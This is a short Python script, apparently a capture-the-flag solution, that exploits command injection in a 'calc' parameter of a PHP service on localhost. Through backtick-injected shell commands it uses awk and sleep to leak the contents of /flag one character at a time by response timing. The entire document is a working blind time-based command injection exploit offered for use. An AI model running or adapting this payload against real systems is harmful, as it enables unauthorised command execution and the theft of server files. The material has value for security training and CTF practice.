#!/usr/bin/env python

import os
import requests
import string

HOST = "127.0.0.1"
PORT = 8099

def execute(command):
    url = "http://%s:%d/index.php?calc=%s" % (HOST, PORT, command)
    try:
        requests.get(url, timeout=0.1).content
        return False
    except Exception as e:
        print e
        return True

def guess_one_byte(index, known):
    command = ("`cat /flag|awk '{if(substr($1,%d,%d)==\"%s\") system(\"sleep 0.2\") }'`" % (index + 1, len(known), known))
    print command
    return execute(command)

def guess(charset, length):
    flag = ""
    for i in range(length):
        for j in (charset):
            if guess_one_byte(i, j):
                flag += j
            print "FLAG: %s" % (flag)

LENGTH = 36
CHARSET = [chr(i) for i in range(0x20, 0x80)]

print guess(CHARSET, LENGTH)
